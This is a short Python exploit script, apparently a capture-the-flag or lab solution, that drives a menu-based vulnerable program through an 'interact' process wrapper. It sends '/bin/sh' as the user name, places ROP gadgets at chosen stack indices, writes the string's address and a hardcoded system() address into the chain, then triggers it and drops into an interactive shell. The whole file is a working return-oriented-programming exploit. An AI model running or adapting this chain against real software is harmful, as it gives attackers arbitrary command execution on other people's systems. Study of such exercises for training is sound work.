import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

system_address = "0x7f000026d390"
p = interact.Process()


p.readuntil('[*] Enter your name')
p.sendline('/bin/sh')


p.readuntil("Choice:")
p.sendline("1")
p.readuntil("2. Add Gadget: { ret }")
p.sendline("1")
p.readuntil("What index should the gadget be placed at?")
p.sendline("88")


p.readuntil("Choice:")
p.sendline("1")
p.readuntil("2. Add Gadget: { ret }")
p.sendline("2")
p.readuntil("What index should the gadget be placed at?")
p.sendline("104")


p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("96")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x6020e0")


p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("112")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline(system_address)


p.readuntil("Choice:")
p.sendline("5")

p.interactive()